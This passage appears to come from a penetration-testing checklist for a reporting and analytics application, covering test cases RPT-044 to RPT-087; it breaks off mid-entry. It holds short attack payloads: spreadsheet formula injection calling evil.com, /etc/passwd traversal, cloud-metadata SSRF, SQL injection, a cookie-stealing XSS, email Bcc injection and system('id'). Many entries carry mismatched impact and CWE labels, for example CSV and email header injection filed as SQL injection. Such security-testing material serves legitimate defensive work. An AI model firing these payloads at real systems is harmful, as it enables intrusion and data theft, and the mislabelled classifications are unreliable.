**Impact:** Stored/reflected XSS in this feature -&gt; session/token theft, cross-user account compromise.

**Tools:** Burp Suite / XSS Hunter

**References:** CWE-79; -&gt;[XSS checklist](#/checklist/xss); PortSwigger XSS; Cure53

---

## RPT-044 — Chart Data Point Manipulation
**Test Category:** Business Logic · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Data Visualization / Charts

**Test Steps:** 1. View chart 2. Modify data points in request 3. Display false data 4. Misleading visualization

**Expected Result:** Data should be server-authoritative

**Payload Example:**

```
Modify chart data response to show fake metrics
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite / Browser DevTools

**References:** CWE-840; PortSwigger Business logic

---

## RPT-045 — Export IDOR
**Test Category:** Broken Access Control · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Export Reports (PDF/Excel)

**Test Steps:** 1. Export own report 2. Modify report_id 3. Export another user's report 4. Data exfiltration

**Expected Result:** Export should verify ownership

**Payload Example:**

```
GET /api/reports/victim_report_id/export
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman / Autorize

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## RPT-046 — Export All Data Bypass
**Test Category:** Broken Access Control · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Export Reports (PDF/Excel)

**Test Steps:** 1. Export with pagination 2. Modify limit parameter 3. Export all data 4. Mass data breach

**Expected Result:** Export limits should be enforced

**Payload Example:**

```
?limit=999999&offset=0
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## RPT-047 — CSV Injection in Export
**Test Category:** Injection · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Export Reports (PDF/Excel)

**Test Steps:** 1. Data contains formula 2. Export to CSV 3. Open in Excel 4. Formula executes

**Expected Result:** CSV should escape formula characters

**Payload Example:**

```
=CMD|'/C calc'!A0 or =HYPERLINK("http://evil.com")
```

**Impact:** SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks).

**Tools:** Burp Suite / Excel

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings

---

## RPT-048 — Excel Macro Injection
**Test Category:** Injection · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Export Reports (PDF/Excel)

**Test Steps:** 1. Data contains macro code 2. Export to XLSX 3. Open file 4. Macro executes

**Expected Result:** Excel export should not allow macros

**Payload Example:**

```
=EXEC("cmd") in data field
```

**Impact:** SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks).

**Tools:** Burp Suite / Excel

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings

---

## RPT-049 — PDF Export XSS
**Test Category:** Cross-Site Scripting · **Severity:** Medium · **CVSS:** 6.1 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N)

**Where to Test / Injection Point:** Export Reports (PDF/Excel)

**Test Steps:** 1. Data contains HTML/JS 2. Export to PDF 3. PDF rendered 4. Script executes

**Expected Result:** PDF content should be sanitized

**Payload Example:**

```
<script>alert(1)</script> in report data
```

**Impact:** Stored/reflected XSS in this feature -&gt; session/token theft, cross-user account compromise.

**Tools:** Burp Suite / PDF Tools

**References:** CWE-79; -&gt;[XSS checklist](#/checklist/xss); PortSwigger XSS; Cure53

---

## RPT-050 — PDF Export SSRF via Image
**Test Category:** Server-Side Request Forgery · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Export Reports (PDF/Excel)

**Test Steps:** 1. Report contains image URL 2. Export to PDF 3. Server fetches image 4. SSRF

**Expected Result:** PDF export should validate URLs

**Payload Example:**

```
image_url=http://169.254.169.254/
```

**Impact:** SSRF -&gt; internal-service reach / cloud metadata credential theft.

**Tools:** Burp Suite / SSRFmap

**References:** CWE-918; -&gt;[SSRF checklist](#/checklist/ssrf); Orange Tsai 'A New Era of SSRF'; PortSwigger

---

## RPT-051 — Export Path Traversal
**Test Category:** Path Traversal · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Export Reports (PDF/Excel)

**Test Steps:** 1. Request export 2. Modify filename parameter 3. Traverse path 4. Overwrite files

**Expected Result:** Export paths should be validated

**Payload Example:**

```
filename=../../../etc/passwd
```

**Impact:** Path traversal -&gt; secret/cross-user file read or out-of-dir write -&gt; RCE.

**Tools:** Burp Suite / DotDotPwn

**References:** CWE-22; -&gt;[Path Traversal checklist](#/checklist/pathtraversal); PortSwigger path traversal; Orange Tsai

---

## RPT-052 — Export XXE via XLSX
**Test Category:** XML External Entity · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Export Reports (PDF/Excel)

**Test Steps:** 1. Generate XLSX export 2. XLSX contains XXE 3. Server processes 4. File disclosure

**Expected Result:** XLSX generation should be secure

**Payload Example:**

```
XXE in Excel XML content types
```

**Impact:** XXE -&gt; local file read / SSRF / OOB exfiltration.

**Tools:** Burp Suite / XXEinjector

**References:** CWE-611; -&gt;[XXE checklist](#/checklist/xxe); PortSwigger XXE

---

## RPT-053 — Export SQL Injection
**Test Category:** Injection · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Export Reports (PDF/Excel)

**Test Steps:** 1. Export with filter 2. Inject SQL in filter 3. Execute malicious query 4. Export all data

**Expected Result:** Export queries should be parameterized

**Payload Example:**

```
filter='; SELECT * FROM all_data--
```

**Impact:** SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks).

**Tools:** SQLMap / Burp Suite

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings

---

## RPT-054 — Export Token Manipulation
**Test Category:** Broken Access Control · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Export Reports (PDF/Excel)

**Test Steps:** 1. Generate export token 2. Analyze token structure 3. Forge token for other data 4. Unauthorized export

**Expected Result:** Export tokens should be cryptographically secure

**Payload Example:**

```
Modify export_token to access other reports
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite Sequencer / Custom Scripts

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## RPT-055 — Export DoS via Large Dataset
**Test Category:** Denial of Service · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Export Reports (PDF/Excel)

**Test Steps:** 1. Request export of all data 2. Server generates huge file 3. Memory exhaustion 4. DoS

**Expected Result:** Export should have size limits

**Payload Example:**

```
Export with no pagination limits
```

**Impact:** Denial of service -&gt; availability impact for this feature / the app.

**Tools:** Burp Suite / Custom Scripts

**References:** CWE-400; -&gt;[Race Condition checklist](#/checklist/racecondition); OWASP; PortSwigger

---

## RPT-056 — Export Job IDOR
**Test Category:** Broken Access Control · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Export Reports (PDF/Excel)

**Test Steps:** 1. Create export job 2. Modify job_id 3. Download others' exports 4. Access their data

**Expected Result:** Export jobs should verify ownership

**Payload Example:**

```
GET /api/exports/jobs/victim_job_id/download
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## RPT-057 — Export SSRF via Webhook
**Test Category:** Server-Side Request Forgery · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Export Reports (PDF/Excel)

**Test Steps:** 1. Export with webhook notification 2. Set internal URL 3. Export triggers webhook 4. SSRF

**Expected Result:** Webhook URLs should be validated

**Payload Example:**

```
webhook=http://internal-service:8080
```

**Impact:** SSRF -&gt; internal-service reach / cloud metadata credential theft.

**Tools:** Burp Suite / SSRFmap

**References:** CWE-918; -&gt;[SSRF checklist](#/checklist/ssrf); Orange Tsai 'A New Era of SSRF'; PortSwigger

---

## RPT-058 — Sensitive Data in Exported Fields
**Test Category:** Information Disclosure · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Export Reports (PDF/Excel)

**Test Steps:** 1. Export report 2. Check for hidden fields 3. Find sensitive data 4. PII exposure

**Expected Result:** Export should filter sensitive fields

**Payload Example:**

```
Exported file containing password hashes or API keys
```

**Impact:** Sensitive data / secret exposure -&gt; credential or token disclosure enabling further attack.

**Tools:** Manual Review / Burp Suite

**References:** CWE-200; -&gt;[JWT checklist](#/checklist/jwt); OWASP WSTG-ATHN; PortSwigger

---

## RPT-059 — Export Format Injection
**Test Category:** Injection · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Export Reports (PDF/Excel)

**Test Steps:** 1. Request specific format 2. Inject malicious format 3. Server error 4. Information disclosure

**Expected Result:** Formats should be whitelisted

**Payload Example:**

```
format=../../../etc/passwd or format=php
```

**Impact:** SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks).

**Tools:** Burp Suite / Postman

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings

---

## RPT-060 — Schedule IDOR Access
**Test Category:** Broken Access Control · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Scheduled Reports

**Test Steps:** 1. View own scheduled reports 2. Modify schedule_id 3. View others' schedules 4. Information disclosure

**Expected Result:** Schedule access should verify ownership

**Payload Example:**

```
GET /api/schedules/victim_schedule_id
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman / Autorize

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## RPT-061 — Schedule IDOR Modification
**Test Category:** Broken Access Control · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Scheduled Reports

**Test Steps:** 1. Edit own schedule 2. Modify schedule_id 3. Edit others' schedule 4. Alter their delivery

**Expected Result:** Schedule modification should verify ownership

**Payload Example:**

```
PUT /api/schedules/victim_schedule_id
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## RPT-062 — Schedule IDOR Deletion
**Test Category:** Broken Access Control · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Scheduled Reports

**Test Steps:** 1. Delete own schedule 2. Modify schedule_id 3. Delete others' schedule 4. Disrupt reporting

**Expected Result:** Deletion should verify ownership

**Payload Example:**

```
DELETE /api/schedules/victim_schedule_id
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## RPT-063 — Schedule Recipient Email Injection
**Test Category:** Injection · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Scheduled Reports

**Test Steps:** 1. Set schedule recipients 2. Inject email headers 3. Send spam 4. Reputation damage

**Expected Result:** Email fields should be sanitized

**Payload Example:**

```
recipient=victim@test.com%0ABcc:spam@evil.com
```

**Impact:** SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks).

**Tools:** Burp Suite / Email Analysis

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings

---

## RPT-064 — Schedule Privilege Escalation
**Test Category:** Broken Access Control · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Scheduled Reports

**Test Steps:** 1. Create schedule as user 2. Add admin recipient 3. Send reports to admins 4. Information disclosure

**Expected Result:** Recipients should be validated

**Payload Example:**

```
Schedule report to admin@company.com without permission
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## RPT-065 — Schedule Time Manipulation
**Test Category:** Business Logic · **Severity:** Low · **CVSS:** 3.7 (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Scheduled Reports

**Test Steps:** 1. Set schedule time 2. Modify to run immediately 3. Bypass scheduled time 4. Premature execution

**Expected Result:** Schedule times should be validated

**Payload Example:**

```
{"next_run":"2020-01-01T00:00:00Z"} for immediate run
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite / Postman

**References:** CWE-840; PortSwigger Business logic

---

## RPT-066 — Schedule Frequency Abuse
**Test Category:** Denial of Service · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Scheduled Reports

**Test Steps:** 1. Create schedule 2. Set to every minute 3. Flood server with jobs 4. DoS

**Expected Result:** Minimum frequency should be enforced

**Payload Example:**

```
{"frequency":"* * * * *"} every minute
```

**Impact:** Denial of service -&gt; availability impact for this feature / the app.

**Tools:** Burp Suite / Postman

**References:** CWE-400; -&gt;[Race Condition checklist](#/checklist/racecondition); OWASP; PortSwigger

---

## RPT-067 — Schedule SQL Injection
**Test Category:** Injection · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Scheduled Reports

**Test Steps:** 1. Create schedule with filters 2. Inject SQL in filter 3. SQL executes on schedule 4. Data breach

**Expected Result:** Schedule filters should be parameterized

**Payload Example:**

```
schedule_filter='; SELECT * FROM users--
```

**Impact:** SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks).

**Tools:** SQLMap / Burp Suite

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings

---

## RPT-068 — Schedule XSS in Email
**Test Category:** Cross-Site Scripting · **Severity:** Medium · **CVSS:** 6.1 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N)

**Where to Test / Injection Point:** Scheduled Reports

**Test Steps:** 1. Set schedule email subject 2. Inject XSS 3. Recipient views email 4. XSS executes

**Expected Result:** Email content should be sanitized

**Payload Example:**

```
subject=<script>stealCookies()</script>
```

**Impact:** Stored/reflected XSS in this feature -&gt; session/token theft, cross-user account compromise.

**Tools:** Burp Suite / XSS Hunter

**References:** CWE-79; -&gt;[XSS checklist](#/checklist/xss); PortSwigger XSS; Cure53

---

## RPT-069 — Schedule Attachment Path Traversal
**Test Category:** Path Traversal · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Scheduled Reports

**Test Steps:** 1. Schedule includes attachment 2. Modify attachment path 3. Attach system files 4. Data breach

**Expected Result:** Attachment paths should be validated

**Payload Example:**

```
attachment=../../../etc/passwd
```

**Impact:** Path traversal -&gt; secret/cross-user file read or out-of-dir write -&gt; RCE.

**Tools:** Burp Suite / DotDotPwn

**References:** CWE-22; -&gt;[Path Traversal checklist](#/checklist/pathtraversal); PortSwigger path traversal; Orange Tsai

---

## RPT-070 — Schedule Cross-Tenant Access
**Test Category:** Broken Access Control · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Scheduled Reports

**Test Steps:** 1. Create schedule in tenant A 2. Modify tenant_id 3. Send tenant B's data 4. Cross-tenant breach

**Expected Result:** Schedules should be tenant-scoped

**Payload Example:**

```
{"tenant_id":"victim_tenant",report_id:"sensitive_report"}
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## RPT-071 — Schedule CSRF
**Test Category:** Cross-Site Request Forgery · **Severity:** Medium · **CVSS:** 6.1 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N)

**Where to Test / Injection Point:** Scheduled Reports

**Test Steps:** 1. Create malicious page 2. Auto-create schedule 3. User visits page 4. Schedule created without consent

**Expected Result:** Schedule creation should have CSRF protection

**Payload Example:**

```
<form action="/schedules/create" method="POST">
```

**Impact:** CSRF on a state-changing action -&gt; forced account/settings change, chainable to ATO.

**Tools:** Burp Suite CSRF PoC / Custom HTML

**References:** CWE-352; -&gt;[CSRF checklist](#/checklist/csrf); PortSwigger CSRF + SameSite

---

## RPT-072 — Schedule Webhook SSRF
**Test Category:** Server-Side Request Forgery · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Scheduled Reports

**Test Steps:** 1. Set schedule webhook 2. Provide internal URL 3. Schedule triggers 4. SSRF execution

**Expected Result:** Webhook URLs should be validated

**Payload Example:**

```
webhook=http://169.254.169.254/
```

**Impact:** SSRF -&gt; internal-service reach / cloud metadata credential theft.

**Tools:** Burp Suite / SSRFmap

**References:** CWE-918; -&gt;[SSRF checklist](#/checklist/ssrf); Orange Tsai 'A New Era of SSRF'; PortSwigger

---

## RPT-073 — Schedule Report IDOR
**Test Category:** Broken Access Control · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Scheduled Reports

**Test Steps:** 1. Schedule report 2. Modify report_id 3. Schedule others' reports 4. Access their data

**Expected Result:** Report association should verify access

**Payload Example:**

```
POST /api/schedules {"report_id":"victim_private_report"}
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## RPT-074 — Schedule Execution Log IDOR
**Test Category:** Broken Access Control · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Scheduled Reports

**Test Steps:** 1. View execution logs 2. Modify schedule_id 3. View others' logs 4. Information disclosure

**Expected Result:** Logs should verify schedule ownership

**Payload Example:**

```
GET /api/schedules/victim_id/logs
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## RPT-075 — Real-time Data WebSocket IDOR
**Test Category:** Broken Access Control · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Real-time Analytics

**Test Steps:** 1. Connect to analytics WebSocket 2. Modify channel/topic 3. Subscribe to others' data 4. Monitor their activity

**Expected Result:** WebSocket subscriptions should verify access

**Payload Example:**

```
Subscribe to channel: user_victim_analytics
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / WS King

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## RPT-076 — Real-time Dashboard Injection
**Test Category:** Cross-Site Scripting · **Severity:** High · **CVSS:** 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N)

**Where to Test / Injection Point:** Real-time Analytics

**Test Steps:** 1. Send data to real-time dashboard 2. Include XSS payload 3. Data displayed 4. XSS executes

**Expected Result:** Real-time data should be sanitized

**Payload Example:**

```
Send {"event":"<script>alert(1)</script>"} via WebSocket
```

**Impact:** Stored/reflected XSS in this feature -&gt; session/token theft, cross-user account compromise.

**Tools:** Burp Suite / WS King

**References:** CWE-79; -&gt;[XSS checklist](#/checklist/xss); PortSwigger XSS; Cure53

---

## RPT-077 — Real-time Stream Hijacking
**Test Category:** Broken Access Control · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Real-time Analytics

**Test Steps:** 1. Get stream authentication 2. Analyze token 3. Generate token for other users 4. Access their streams

**Expected Result:** Stream tokens should be unpredictable

**Payload Example:**

```
Forge stream_token for victim's real-time data
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite Sequencer / Custom Scripts

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## RPT-078 — Real-time Data Injection
**Test Category:** Injection · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Real-time Analytics

**Test Steps:** 1. Send data to analytics 2. Inject malicious data 3. Data processed 4. Injection executed

**Expected Result:** Data ingestion should sanitize inputs

**Payload Example:**

```
Send SQL payload via analytics event
```

**Impact:** SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks).

**Tools:** Burp Suite / Postman

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings

---

## RPT-079 — Real-time Connection Flooding
**Test Category:** Denial of Service · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Real-time Analytics

**Test Steps:** 1. Open many WebSocket connections 2. Exhaust server resources 3. DoS 4. Service disruption

**Expected Result:** Connection limits should be enforced

**Payload Example:**

```
1000 simultaneous WebSocket connections
```

**Impact:** Missing anti-automation/rate-limit -&gt; brute force, OTP/2FA guessing, resource-flood abuse.

**Tools:** Turbo Intruder / Custom Scripts

**References:** CWE-799; -&gt;[Account Takeover checklist](#/checklist/ato); OWASP WSTG-ATHN-04; PortSwigger

---

## RPT-080 — Real-time Metric Manipulation
**Test Category:** Business Logic · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Real-time Analytics

**Test Steps:** 1. Send false metrics 2. Manipulate real-time data 3. Display incorrect analytics 4. Business impact

**Expected Result:** Data should be validated before display

**Payload Example:**

```
Send {"revenue":9999999999} via tracking API
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite / Postman

**References:** CWE-840; PortSwigger Business logic

---

## RPT-081 — Real-time Cross-User Data Leak
**Test Category:** Broken Access Control · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Real-time Analytics

**Test Steps:** 1. View real-time data 2. Modify user context 3. View others' live data 4. Privacy violation

**Expected Result:** Real-time data should be user-scoped

**Payload Example:**

```
GET /api/realtime?user_id=victim_id
```

**Impact:** Sensitive data / secret exposure -&gt; credential or token disclosure enabling further attack.

**Tools:** Burp Suite / Postman / Autorize

**References:** CWE-200; -&gt;[JWT checklist](#/checklist/jwt); OWASP WSTG-ATHN; PortSwigger

---

## RPT-082 — Real-time Event Replay Attack
**Test Category:** Business Logic · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Real-time Analytics

**Test Steps:** 1. Capture real-time events 2. Replay events 3. Duplicate data 4. Analytics manipulation

**Expected Result:** Events should have replay protection

**Payload Example:**

```
Replay captured tracking events
```

**Impact:** Broken auth in this flow -&gt; account takeover of any user (bypass/replay/reset/2FA defeat).

**Tools:** Burp Suite / Postman

**References:** CWE-640; -&gt;[Account Takeover checklist](#/checklist/ato); PortSwigger Authentication; disclosed ATO writeups

---

## RPT-083 — Real-time API Key Exposure
**Test Category:** Information Disclosure · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Real-time Analytics

**Test Steps:** 1. Inspect real-time connection 2. Find API key 3. Extract key 4. Abuse key

**Expected Result:** API keys should be server-side

**Payload Example:**

```
API key exposed in WebSocket connection
```

**Impact:** Sensitive data / secret exposure -&gt; credential or token disclosure enabling further attack.

**Tools:** Browser DevTools / Burp Suite

**References:** CWE-200; -&gt;[JWT checklist](#/checklist/jwt); OWASP WSTG-ATHN; PortSwigger

---

## RPT-084 — Real-time Filter Bypass
**Test Category:** Broken Access Control · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Real-time Analytics

**Test Steps:** 1. Apply real-time filter 2. Modify filter parameters 3. Access filtered-out data 4. See restricted metrics

**Expected Result:** Filters should be server-enforced

**Payload Example:**

```
Modify client-side filter to show hidden data
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Browser DevTools

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## RPT-085 — Real-time Aggregation Bypass
**Test Category:** Broken Access Control · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Real-time Analytics

**Test Steps:** 1. View aggregated real-time data 2. Request raw data 3. Access individual records 4. Privacy violation

**Expected Result:** Raw data should require additional permissions

**Payload Example:**

```
GET /api/realtime/raw bypassing aggregation
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## RPT-086 — Real-time Alert Injection
**Test Category:** Injection · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Real-time Analytics

**Test Steps:** 1. Configure real-time alert 2. Inject payload in alert condition 3. Alert triggers 4. Injection executes

**Expected Result:** Alert conditions should be safely parsed

**Payload Example:**

```
alert_condition="value > 0; system('id')"
```

**Impact:** SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks).

**Tools:** Burp Suite / Postman

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings

---

## RPT-087 — Activity Log IDOR
**Test Category:** Broken Access Control · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** User Activity Tracking

**Test Steps:** 1. View own activity 2. Modify user_id 3. View others' activity 4. Privacy violation

**Expected Result:** Activity logs should be user-specific

**Payload Example:**

```
